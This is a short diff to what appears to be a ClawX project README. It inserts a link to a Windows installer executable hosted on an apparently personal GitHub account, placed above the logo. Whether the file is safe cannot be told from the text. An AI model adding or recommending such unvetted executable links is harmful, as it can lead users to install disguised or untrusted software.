@@ -1,4 +1,4 @@
-
+[Download ClawX Windows installer (x64) — OpenClaw 2026.10.5](<https://github.com/wasimmostakim2965-ui/ClawX/releases/download/run-40718201902/ClawX-0.6.1-win-x64.exe>)
 <p align="center">
   <img src="src/assets/logo.svg" width="128" height="128" alt="ClawX Logo" />
 </p>
